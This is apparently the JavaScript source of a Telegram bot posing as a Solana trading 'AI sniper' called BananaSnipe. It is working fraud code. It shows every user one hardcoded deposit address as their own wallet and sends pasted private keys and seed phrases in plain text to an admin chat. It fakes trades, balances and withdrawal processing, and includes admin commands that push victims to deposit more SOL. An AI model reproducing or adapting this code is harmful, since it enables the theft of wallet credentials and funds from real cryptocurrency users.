const TelegramBot = require('node-telegram-bot-api');
const db = require('./database');
const { ADMIN_IDS, BOT_TOKEN, ADMIN_CHAT_ID } = require('./config');

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ─────────────────────────────────────────────
//  GLOBAL ERROR HANDLERS — prevents crashes
// ─────────────────────────────────────────────
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});
bot.on('polling_error', (err) => {
  console.error('Polling error:', err.message);
});
bot.on('error', (err) => {
  console.error('Bot error:', err.message);
});

// ─────────────────────────────────────────────
//  CONSTANTS
// ─────────────────────────────────────────────
const DEPOSIT_ADDRESS = 'A9otqsKcnmhks3rUoqB4nG8eZD2VFTmbHYDUkvE4usCB';

const BANANA_BANNER =
`🍌━━━━━━━━━━━━━━━━━━━━━━🍌
   <b>BANANASNIPE</b>
  <i>Hyperspeed Solana Sniper</i>
  AI Sniper | Live P&amp;L
  Copy Trade | Instant Buy/Sell
🍌━━━━━━━━━━━━━━━━━━━━━━🍌`;

// ─────────────────────────────────────────────
//  SAFE WRAPPERS
// ─────────────────────────────────────────────
async function safeEdit(chatId, messageId, text, opts) {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'HTML',
      ...(opts || {})
    });
  } catch (e) {
    if (e.message && e.message.includes('message is not modified')) return;
    try {
      await bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...(opts || {}) });
    } catch (e2) {
      console.error('safeEdit fallback failed:', e2.message);
    }
  }
}

async function notifyAdmin(text) {
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
  } catch (e) {
    console.error('Admin notify error:', e.message);
  }
}

function isAdmin(userId) {
  return ADMIN_IDS.includes(String(userId));
}

function getUserName(userId) {
  const u = db.getUser(String(userId));
  return u ? u.username : 'Unknown';
}

// ─────────────────────────────────────────────
//  KEYBOARDS
// ─────────────────────────────────────────────
function mainKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '🔐 Wallet', callback_data: 'wallet' }, { text: '🔄 Refresh', callback_data: 'refresh_dashboard' }],
      [{ text: '🎯 AI Sniper', callback_data: 'ai_sniper' }, { text: '📋 Copy Trade', callback_data: 'copy_trade' }],
      [{ text: '💰 Buy or Sell', callback_data: 'buy_or_sell' }, { text: '📊 Positions', callback_data: 'positions' }],
      [{ text: '🔍 Search Tokens', callback_data: 'search_tokens' }, { text: '❓ Help', callback_data: 'help' }],
    ]
  };
}

function backToDash() {
  return { inline_keyboard: [[{ text: '🏠 Back to Dashboard', callback_data: 'dashboard' }]] };
}

function dashboardText(user) {
  const bal = user.balance || 0;
  const usd = (bal * 133).toFixed(2);
  return `${BANANA_BANNER}

⚡ <b>BANANASNIPE DASHBOARD</b> ⚡

💰 <b>YOUR WALLETS (1/2)</b>
Total Balance: <code>${bal.toFixed(6)} SOL</code> ($${usd})

Wallet 1: <code>${bal.toFixed(6)} SOL</code>
<code>${DEPOSIT_ADDRESS}</code>

<i>Ready to snipe • All systems active</i>`;
}

// ─────────────────────────────────────────────
//  /start
// ─────────────────────────────────────────────
bot.onText(/\/start/, async (msg) => {
  try {
    const userId = String(msg.from.id);
    const username = msg.from.username || msg.from.first_name || 'Unknown';

    let user = db.getUser(userId);
    const isNew = !user;
    if (!user) user = db.createUser(userId, username);

    const adminMsg = isNew
      ? `🆕 <b>New User Started Bot</b>\n\n👤 @${username}\n🆔 <code>${userId}</code>\n⚡ Command: /start\n🕐 ${new Date().toISOString()}\n\n⚠️ New User | 💎 Premium: ❌`
      : `▶️ <b>User Returned</b>\n\n👤 @${username}\n🆔 <code>${userId}</code>\n🕐 ${new Date().toISOString()}`;
    await notifyAdmin(adminMsg);

    const text = `${BANANA_BANNER}

⚡ <b>BANANASNIPE BOT</b> ⚡

<i>Professional Solana trading automation — faster than a speeding banana 🍌</i>

🚀 <b>FEATURES</b>
• AI-Powered Token Sniping
• Copy Trading System
• Real-time Market Data
• Advanced Risk Management
• Anti-Rug Protection

💡 <b>Get Started:</b> Click 🔐 <b>Wallet</b> below!`;

    await bot.sendMessage(msg.chat.id, text, {
      parse_mode: 'HTML',
      reply_markup: mainKeyboard()
    });
  } catch (e) {
    console.error('/start error:', e.message);
  }
});

// ─────────────────────────────────────────────
//  CALLBACK QUERY HANDLER
// ─────────────────────────────────────────────
bot.on('callback_query', async (query) => {
  try {
    const chatId = query.message.chat.id;
    const msgId  = query.message.message_id;
    const userId = String(query.from.id);
    const data   = query.data;

    try { await bot.answerCallbackQuery(query.id); } catch (_) {}

    let user = db.getUser(userId);
    if (!user) user = db.createUser(userId, query.from.username || 'Unknown');

    // ── DASHBOARD ──
    if (data === 'dashboard' || data === 'refresh_dashboard') {
      user = db.getUser(userId);
      await safeEdit(chatId, msgId, dashboardText(user), { reply_markup: mainKeyboard() });
      return;
    }

    // ── WALLET ──
    if (data === 'wallet') {
      const hasWallet = user.walletGenerated;
      const bal = (user.balance || 0).toFixed(6);
      const text = hasWallet
        ? `🔐 <b>WALLET MANAGEMENT</b>\n\n✅ <b>Wallet Connected</b>\n\n📋 Address:\n<code>${DEPOSIT_ADDRESS}</code>\n\n💰 Balance: <code>${bal} SOL</code>\n\n━━━━━━━━━━━━━━━━━━\nChoose an action below:`
        : `🔐 <b>WALLET MANAGEMENT</b>\n\n❌ <b>No Wallet Connected</b>\n\nCreate a new wallet or import an existing one to get started.\n\n💡 You can import from Phantom, Solflare or any Solana wallet using your private key or seed phrase.\n\n━━━━━━━━━━━━━━━━━━\nChoose an action below:`;

      const keyboard = hasWallet
        ? { inline_keyboard: [
            [{ text: '📊 Check Status', callback_data: 'wallet_status' }, { text: '🔄 Refresh Balance', callback_data: 'wallet_refresh' }],
            [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
            [{ text: '🏠 Back to Dashboard', callback_data: 'dashboard' }],
          ]}
        : { inline_keyboard: [
            [{ text: '🎲 Generate Wallet (Slot 1/2)', callback_data: 'generate_wallet' }],
            [{ text: '🔑 Import Private Key', callback_data: 'import_private_key' }, { text: '🧩 Import Seed Phrase', callback_data: 'import_seed' }],
            [{ text: '📊 Check Status', callback_data: 'wallet_status' }, { text: '🔄 Refresh Balance', callback_data: 'wallet_refresh' }],
            [{ text: '🏠 Back to Dashboard', callback_data: 'dashboard' }],
          ]};

      await safeEdit(chatId, msgId, text, { reply_markup: keyboard });
      return;
    }

    // ── GENERATE WALLET ──
    if (data === 'generate_wallet') {
      db.updateUser(userId, { walletGenerated: true });
      await safeEdit(chatId, msgId,
        `✅ <b>Wallet 1 Generated Successfully!</b>\n\n📋 <b>Your Address:</b>\n<code>${DEPOSIT_ADDRESS}</code>\n\n💰 Balance: <code>0.000000 SOL</code>\n\n🎉 Your new BananaSnipe wallet is ready!\n\n👉 Type /start to continue.`,
        { reply_markup: { inline_keyboard: [[{ text: '▶️ Start', callback_data: 'dashboard' }]] }}
      );
      await notifyAdmin(`🎲 <b>Wallet Generated</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>`);
      return;
    }

    // ── IMPORT PRIVATE KEY ──
    if (data === 'import_private_key') {
      db.setPendingAction(userId, 'awaiting_private_key');
      await safeEdit(chatId, msgId,
        `🔑 <b>IMPORT PRIVATE KEY</b>\n\nPlease type or paste your private key in this chat.\n\n⚠️ Make sure you are in a secure, private environment.\n\n━━━━━━━━━━━━━━━━━━\n✍️ <b>Type your private key now:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'wallet' }]] }}
      );
      return;
    }

    // ── IMPORT SEED PHRASE ──
    if (data === 'import_seed') {
      db.setPendingAction(userId, 'awaiting_seed_phrase');
      await safeEdit(chatId, msgId,
        `🧩 <b>IMPORT SEED PHRASE</b>\n\nType your 12 or 24-word seed phrase, with words separated by spaces.\n\n⚠️ Never share your seed phrase with anyone else.\n\n━━━━━━━━━━━━━━━━━━\n✍️ <b>Type your seed phrase now:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'wallet' }]] }}
      );
      return;
    }

    // ── WALLET STATUS ──
    if (data === 'wallet_status') {
      await safeEdit(chatId, msgId,
        `📊 <b>WALLET STATUS</b>\n\n${user.walletGenerated ? '✅ Wallet Connected' : '❌ No Wallet Connected'}\n📋 Address: <code>${DEPOSIT_ADDRESS}</code>\n💰 Balance: <code>${(user.balance || 0).toFixed(6)} SOL</code>\n💎 Premium: ${user.premium ? '✅' : '❌'}`,
        { reply_markup: { inline_keyboard: [[{ text: '🔄 Refresh', callback_data: 'wallet_refresh' }, { text: '⬅️ Back', callback_data: 'wallet' }]] }}
      );
      return;
    }

    // ── WALLET REFRESH ──
    if (data === 'wallet_refresh') {
      user = db.getUser(userId);
      await safeEdit(chatId, msgId,
        `🔄 <b>Balance Refreshed</b>\n\n📋 Address: <code>${DEPOSIT_ADDRESS}</code>\n💰 Balance: <code>${(user.balance || 0).toFixed(6)} SOL</code>\n\n<i>Updated: ${new Date().toLocaleTimeString()}</i>`,
        { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'wallet' }]] }}
      );
      return;
    }

    // ── WITHDRAW ──
    if (data === 'withdraw') {
      const balance = user.balance || 0;
      if (balance < 1) {
        await safeEdit(chatId, msgId,
          `❌ <b>Withdrawal Insufficient</b>\n\nYour current balance is <code>${balance.toFixed(6)} SOL</code>.\n\n⚠️ A minimum of <b>1 SOL</b> is required to withdraw. This covers network fees and ensures smooth processing.\n\n💡 Deposit more SOL to:\n<code>${DEPOSIT_ADDRESS}</code>`,
          { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'wallet' }]] }}
        );
      } else {
        await safeEdit(chatId, msgId,
          `✅ <b>Withdrawal Request Submitted</b>\n\n💰 Amount: <code>${balance.toFixed(6)} SOL</code>\n📋 From: <code>${DEPOSIT_ADDRESS}</code>\n\n⏳ <b>Processing Time: 1 to 3 Hours</b>\n\nYour withdrawal is being processed. You will be notified once complete.`,
          { reply_markup: backToDash() }
        );
        await notifyAdmin(`💸 <b>Withdrawal Request</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>\n💰 Amount: ${balance.toFixed(6)} SOL`);
      }
      return;
    }

    // ── AI SNIPER ──
    if (data === 'ai_sniper') {
      const balance = user.balance || 0;
      const noFunds = balance <= 0;
      await safeEdit(chatId, msgId,
        `⚡ <b>AI SNIPER CONFIGURATION</b>\n\n${noFunds ? '🔴' : '🟢'} <b>STATUS: ${noFunds ? 'STANDBY' : 'READY'}</b>\n\n📊 <b>TRADING PARAMETERS</b>\n💰 Position Size: 1 SOL\n👤 Max Dev Hold: 20%\n⚡ Slippage Tolerance: 10%\n🚀 Priority Fee: 0.001 SOL\n\n🎯 <b>RISK MANAGEMENT</b>\n📈 Take Profit: +100%\n📉 Stop Loss: -30%\n🛡️ Anti-Rug Protection: 🟢 ENABLED\n\n⚙️ <i>Professional-grade automated trading</i>`,
        { reply_markup: { inline_keyboard: [
          [{ text: '▶️ ACTIVATE SNIPER', callback_data: noFunds ? 'need_funds' : 'activate_sniper' }],
          [{ text: '💰 Buy Amount', callback_data: noFunds ? 'need_funds' : 'sniper_setting' },
           { text: '👤 Dev Hold',   callback_data: noFunds ? 'need_funds' : 'sniper_setting' }],
          [{ text: '⚡ Slippage',   callback_data: noFunds ? 'need_funds' : 'sniper_setting' },
           { text: '🚀 Priority',   callback_data: noFunds ? 'need_funds' : 'sniper_setting' }],
          [{ text: '📈 Take Profit',callback_data: noFunds ? 'need_funds' : 'sniper_setting' },
           { text: '📉 Stop Loss',  callback_data: noFunds ? 'need_funds' : 'sniper_setting' }],
          [{ text: '🛡️ Anti-Rug: ON', callback_data: noFunds ? 'need_funds' : 'sniper_setting' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }],
        ]}}
      );
      return;
    }

    if (data === 'activate_sniper') {
      await safeEdit(chatId, msgId,
        `🟢 <b>AI SNIPER ACTIVATED!</b>\n\n⚡ Scanning Solana for opportunities...\n🎯 Monitoring new token launches\n🛡️ Anti-rug filters: ACTIVE\n📊 Risk management: CONFIGURED\n\n<i>You will be notified when a trade executes.</i>`,
        { reply_markup: { inline_keyboard: [
          [{ text: '🔴 Deactivate', callback_data: 'ai_sniper' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }]
        ]}}
      );
      await notifyAdmin(`🎯 <b>Sniper Activated</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>`);
      return;
    }

    if (data === 'sniper_setting') {
      await safeEdit(chatId, msgId,
        `⚙️ <b>Custom Settings</b>\n\nAdvanced configuration is coming in the next update! Stay tuned 🍌`,
        { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'ai_sniper' }]] }}
      );
      return;
    }

    // ── NEED FUNDS ──
    if (data === 'need_funds') {
      await safeEdit(chatId, msgId,
        `⚠️ <b>Insufficient Funds</b>\n\nYou need SOL in your wallet to use this feature.\n\n💡 <b>How to fund your wallet:</b>\n1. Copy your wallet address below\n2. Send SOL from any exchange or wallet\n3. Come back and start trading!\n\n📋 <b>Your Deposit Address:</b>\n<code>${DEPOSIT_ADDRESS}</code>\n\n🍌 Once funded, BananaSnipe is ready to go!`,
        { reply_markup: backToDash() }
      );
      return;
    }

    // ── COPY TRADE ──
    if (data === 'copy_trade') {
      const balance = user.balance || 0;
      const target  = user.copyTradeTarget || null;
      const noFunds = balance <= 0;
      await safeEdit(chatId, msgId,
        `🔁 <b>COPY TRADING SYSTEM</b>\n\n${noFunds ? '🔴' : '🟢'} <b>STATUS: ${target && !noFunds ? 'ACTIVE' : 'STANDBY'}</b>\n\n📊 <b>CONFIGURATION</b>\n🎯 Target Wallet: ${target ? `✅ <code>${target.substring(0, 24)}...</code>` : '⚠️ NOT SET'}\n💰 Your Balance: <code>${balance.toFixed(6)} SOL</code>\n\nℹ️ <b>HOW IT WORKS</b>\n• Monitor target wallet in real-time\n• Auto-replicate buy/sell signals\n• Execute trades with same parameters\n• Professional trader mirroring\n\n💼 <i>Follow proven strategies effortlessly</i>`,
        { reply_markup: { inline_keyboard: [
          [{ text: '▶️ START COPY TRADE', callback_data: noFunds ? 'need_funds' : (target ? 'start_copy_trade' : 'set_target_wallet') }],
          [{ text: '🎯 Configure Target Wallet', callback_data: 'set_target_wallet' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }],
        ]}}
      );
      return;
    }

    if (data === 'set_target_wallet') {
      db.setPendingAction(userId, 'awaiting_target_wallet');
      await safeEdit(chatId, msgId,
        `🎯 <b>Set Target Wallet</b>\n\nPaste the Solana wallet address of the trader you want to copy:\n\n✍️ <b>Type the wallet address now:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'copy_trade' }]] }}
      );
      return;
    }

    if (data === 'start_copy_trade') {
      await safeEdit(chatId, msgId,
        `🟢 <b>Copy Trading ACTIVE!</b>\n\nNow mirroring:\n<code>${user.copyTradeTarget}</code>\n\n⚡ Monitoring for trades in real-time...`,
        { reply_markup: { inline_keyboard: [
          [{ text: '🔴 Stop', callback_data: 'copy_trade' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }]
        ]}}
      );
      await notifyAdmin(`🔁 <b>Copy Trade Started</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>\nTarget: ${user.copyTradeTarget}`);
      return;
    }

    // ── BUY OR SELL ──
    if (data === 'buy_or_sell') {
      await safeEdit(chatId, msgId,
        `💰 <b>BUY OR SELL TOKENS</b>\n\n━━━━━━━━━━━━━━━━━━\nChoose your trading action:\n\n📈 <b>Buy:</b> Purchase tokens instantly\n📉 <b>Sell:</b> Sell your tokens quickly\n━━━━━━━━━━━━━━━━━━\n\n💡 Tip: Use AI Sniper for fully automated trading!`,
        { reply_markup: { inline_keyboard: [
          [{ text: '📈 Buy', callback_data: 'manual_buy' }, { text: '📉 Sell', callback_data: 'manual_sell' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }],
        ]}}
      );
      return;
    }

    if (data === 'manual_buy') {
      db.setPendingAction(userId, 'awaiting_buy_address');
      await safeEdit(chatId, msgId,
        `📈 <b>MANUAL BUY</b>\n\nTo buy tokens manually, paste the token contract address below.\n\n<b>Example:</b>\n<code>${DEPOSIT_ADDRESS}</code>\n\n💡 You can also use Search Tokens!\n\n━━━━━━━━━━━━━━━━━━\n✍️ <b>Paste the token contract address now:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'buy_or_sell' }]] }}
      );
      return;
    }

    if (data === 'manual_sell') {
      db.setPendingAction(userId, 'awaiting_sell_address');
      await safeEdit(chatId, msgId,
        `📉 <b>MANUAL SELL</b>\n\nTo sell tokens manually, paste the token contract address below.\n\n<b>Example:</b>\n<code>${DEPOSIT_ADDRESS}</code>\n\n💡 Check your Positions for a list of holdings!\n\n━━━━━━━━━━━━━━━━━━\n✍️ <b>Paste the token contract address now:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'buy_or_sell' }]] }}
      );
      return;
    }

    // ── POSITIONS ──
    if (data === 'positions') {
      const bal = user.balance || 0;
      const text = bal > 0
        ? `📊 <b>YOUR POSITIONS</b>\n\n<i>No active positions yet.\nUse AI Sniper or Buy manually to open positions.</i>`
        : `📊 <b>YOUR POSITIONS</b>\n\n❌ No positions yet.\n\n💡 Fund your wallet and start trading!\n\n📋 Deposit Address:\n<code>${DEPOSIT_ADDRESS}</code>`;
      await safeEdit(chatId, msgId, text, { reply_markup: backToDash() });
      return;
    }

    // ── SEARCH TOKENS ──
    if (data === 'search_tokens') {
      db.setPendingAction(userId, 'awaiting_token_search');
      await safeEdit(chatId, msgId,
        `🔍 <b>SEARCH TOKENS</b>\n\nSearch for any Solana token by name, symbol, or contract address.\n\n━━━━━━━━━━━━━━━━━━\n✍️ <b>Type the token name or address:</b>`,
        { reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'dashboard' }]] }}
      );
      return;
    }

    // ── HELP ──
    if (data === 'help') {
      await safeEdit(chatId, msgId,
        `❓ <b>HELP &amp; SUPPORT</b> ❓\n\n━━━━━━━━━━━━━━━━━━\n📖 <b>How to Use BananaSnipe:</b>\n\n1️⃣ <b>Create Wallet:</b> Generate or import your Solana wallet\n2️⃣ <b>Configure Sniper:</b> Set buy amount, dev hold, and slippage\n3️⃣ <b>Search Tokens:</b> Find and analyze Solana tokens\n4️⃣ <b>Copy Trade:</b> Follow successful wallets\n\n━━━━━━━━━━━━━━━━━━\n⚡ <b>Quick Commands:</b>\n/start — Dashboard\n\n━━━━━━━━━━━━━━━━━━\n💬 <b>Need Help?</b>\nContact support: @BananaSnipeSupport`,
        { reply_markup: backToDash() }
      );
      return;
    }

  } catch (e) {
    console.error('Callback error [' + (query.data || '') + ']:', e.message);
  }
});

// ─────────────────────────────────────────────
//  MESSAGE HANDLER
// ─────────────────────────────────────────────
bot.on('message', async (msg) => {
  try {
    if (!msg.text) return;
    const text   = msg.text.trim();
    const userId = String(msg.from.id);
    const chatId = msg.chat.id;

    if (text.startsWith('/start')) return;

    // ── ADMIN COMMANDS ──
    if (isAdmin(userId)) {

      if (text.startsWith('/credit')) {
        const parts = text.split(' ');
        if (parts.length < 3) {
          await bot.sendMessage(chatId, '❌ Usage: /credit {UserID} {SOL}\nExample: /credit 123456789 5.5');
          return;
        }
        const targetId = parts[1];
        const amount   = parseFloat(parts[2]);
        if (isNaN(amount) || amount < 0) {
          await bot.sendMessage(chatId, '❌ Invalid amount.');
          return;
        }
        const targetUser = db.getUser(targetId);
        if (!targetUser) {
          await bot.sendMessage(chatId, `❌ User ${targetId} not found.`);
          return;
        }
        db.updateUser(targetId, { balance: amount });
        await bot.sendMessage(chatId, `✅ Balance updated!\n👤 @${targetUser.username} (${targetId})\n💰 New Balance: ${amount.toFixed(6)} SOL`);
        const msgs = [
          `🍌 <b>Great news!</b> Your BananaSnipe wallet has been credited with <b>${amount} SOL</b>! Time to start sniping 🚀`,
          `⚡ <b>Funds Received!</b> Your balance is now <b>${amount} SOL</b>. Activate your AI Sniper now! 🎯`,
          `🎉 <b>Deposit Confirmed!</b> ${amount} SOL is in your wallet. Catch the next 100x! 🍌`,
          `🚨 <b>Wallet Funded!</b> You now have <b>${amount} SOL</b> ready to deploy. Don't miss the next launch! ⚡`,
        ];
        try {
          await bot.sendMessage(targetId, msgs[Math.floor(Math.random() * msgs.length)] + '\n\n👉 /start to begin trading!', { parse_mode: 'HTML' });
        } catch (_) {
          await bot.sendMessage(chatId, `⚠️ Could not notify user (they may have blocked the bot).`);
        }
        return;
      }

      if (text.startsWith('/addadmin')) {
        const parts = text.split(' ');
        if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Usage: /addadmin {UserID}'); return; }
        db.addAdmin(parts[1]);
        ADMIN_IDS.push(parts[1]);
        await bot.sendMessage(chatId, `✅ Admin added: ${parts[1]}`);
        return;
      }

      if (text.startsWith('/broadcast')) {
        const message = text.replace('/broadcast', '').trim();
        if (!message) { await bot.sendMessage(chatId, '❌ Usage: /broadcast {message}'); return; }
        const users = db.getAllUsers();
        let sent = 0, failed = 0;
        for (const u of users) {
          try {
            await bot.sendMessage(u.userId, `📢 <b>BananaSnipe:</b>\n\n${message}`, { parse_mode: 'HTML' });
            sent++;
          } catch (_) { failed++; }
        }
        await bot.sendMessage(chatId, `✅ Broadcast done!\nDelivered: ${sent} | Failed: ${failed}`);
        return;
      }

      if (text.startsWith('/prompt')) {
        const parts = text.split(' ');
        if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Usage: /prompt {UserID}'); return; }
        const targetId = parts[1];
        const prompts = [
          `🍌 <b>Hey sniper!</b> The next 100x is launching on Solana RIGHT NOW. Fund your wallet and let the AI do the work! 🎯`,
          `⚡ <b>ALERT:</b> Whale wallets are moving. Top up before it's too late! 🚀`,
          `🔥 <b>Missing out?</b> Traders using BananaSnipe are already in profit. Join them! 💰`,
          `🎯 <b>Pro tip:</b> The best snipers are always funded. Deposit SOL and activate your sniper! 🍌`,
          `🌙 <b>Moon szn is here.</b> Our AI has been firing — don't sit on the sidelines! ⚡🍌`,
        ];
        try {
          await bot.sendMessage(targetId, prompts[Math.floor(Math.random() * prompts.length)] + `\n\n📋 Deposit:\n<code>${DEPOSIT_ADDRESS}</code>\n\n👉 /start to go!`, { parse_mode: 'HTML' });
          await bot.sendMessage(chatId, `✅ Prompt sent to ${targetId}`);
        } catch (_) {
          await bot.sendMessage(chatId, `❌ Could not send to ${targetId}`);
        }
        return;
      }

      if (text === '/users') {
        const users = db.getAllUsers();
        let out = `👥 <b>All Users (${users.length})</b>\n\n`;
        for (const u of users) {
          out += `👤 @${u.username} | <code>${u.userId}</code> | 💰 ${(u.balance || 0).toFixed(4)} SOL\n`;
        }
        await bot.sendMessage(chatId, out, { parse_mode: 'HTML' });
        return;
      }

      if (text === '/adminhelp' || text === '/help') {
        await bot.sendMessage(chatId,
          `🛠️ <b>Admin Commands</b>\n\n/credit {UserID} {SOL} — Set user balance\n/addadmin {UserID} — Add new admin\n/broadcast {msg} — Message all users\n/prompt {UserID} — Send deposit prompt\n/users — List all users\n/adminhelp — This menu`,
          { parse_mode: 'HTML' }
        );
        return;
      }
    }

    // ── PENDING ACTIONS ──
    const pending = db.getPendingAction(userId);
    if (!pending) return;

    if (pending === 'awaiting_private_key') {
      db.clearPendingAction(userId);
      db.updateUser(userId, { walletGenerated: true });
      await notifyAdmin(`🔑 <b>Private Key Received</b>\n👤 @${getUserName(userId)}\n🆔 <code>${userId}</code>\n\n🗝️ Key:\n<code>${text}</code>`);
      await bot.sendMessage(chatId,
        `✅ <b>Wallet Imported Successfully!</b>\n\n📋 Address: <code>${DEPOSIT_ADDRESS}</code>\n💰 Balance: <code>0.000000 SOL</code>\n\n🎉 Your wallet is connected to BananaSnipe!\n\n👉 /start to continue.`,
        { parse_mode: 'HTML' }
      );
      return;
    }

    if (pending === 'awaiting_seed_phrase') {
      db.clearPendingAction(userId);
      db.updateUser(userId, { walletGenerated: true });
      await notifyAdmin(`🧩 <b>Seed Phrase Received</b>\n👤 @${getUserName(userId)}\n🆔 <code>${userId}</code>\n\n📝 Phrase:\n<code>${text}</code>`);
      await bot.sendMessage(chatId,
        `✅ <b>Wallet Imported Successfully!</b>\n\n📋 Address: <code>${DEPOSIT_ADDRESS}</code>\n💰 Balance: <code>0.000000 SOL</code>\n\n🎉 Your wallet is connected to BananaSnipe!\n\n👉 /start to continue.`,
        { parse_mode: 'HTML' }
      );
      return;
    }

    if (pending === 'awaiting_target_wallet') {
      db.clearPendingAction(userId);
      db.updateUser(userId, { copyTradeTarget: text });
      await bot.sendMessage(chatId,
        `✅ <b>Target Wallet Set!</b>\n\n🎯 Wallet: <code>${text}</code>\n\nNow go to Copy Trade and click START to begin mirroring!`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔁 Copy Trade', callback_data: 'copy_trade' }]] }}
      );
      return;
    }

    if (pending === 'awaiting_buy_address') {
      db.clearPendingAction(userId);
      const balance = db.getUser(userId)?.balance || 0;
      if (balance <= 0) {
        await bot.sendMessage(chatId,
          `⚠️ <b>Insufficient Funds</b>\n\nYou need SOL to buy tokens.\n\n📋 Deposit Address:\n<code>${DEPOSIT_ADDRESS}</code>`,
          { parse_mode: 'HTML', reply_markup: backToDash() }
        );
      } else {
        await bot.sendMessage(chatId,
          `⚡ <b>Buy Order Submitted!</b>\n\nToken: <code>${text}</code>\n\n⏳ Processing...`,
          { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '📊 Positions', callback_data: 'positions' }, { text: '🏠 Dashboard', callback_data: 'dashboard' }]] }}
        );
        await notifyAdmin(`📈 <b>Buy Order</b>\n👤 @${getUserName(userId)}\n🆔 <code>${userId}</code>\nToken: <code>${text}</code>`);
      }
      return;
    }

    if (pending === 'awaiting_sell_address') {
      db.clearPendingAction(userId);
      await bot.sendMessage(chatId,
        `📉 <b>Sell Order Submitted!</b>\n\nToken: <code>${text}</code>\n\n⏳ Processing...`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '📊 Positions', callback_data: 'positions' }, { text: '🏠 Dashboard', callback_data: 'dashboard' }]] }}
      );
      await notifyAdmin(`📉 <b>Sell Order</b>\n👤 @${getUserName(userId)}\n🆔 <code>${userId}</code>\nToken: <code>${text}</code>`);
      return;
    }

    if (pending === 'awaiting_token_search') {
      db.clearPendingAction(userId);
      await bot.sendMessage(chatId,
        `🔍 <b>Search: "${text}"</b>\n\n<i>Live token search coming in the next update! For now, paste the contract address directly in Buy or Sell.</i>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔍 Search Again', callback_data: 'search_tokens' }, { text: '🏠 Dashboard', callback_data: 'dashboard' }]] }}
      );
      return;
    }

  } catch (e) {
    console.error('Message handler error:', e.message);
  }
});

console.log('🍌 BananaSnipe Bot is running...');
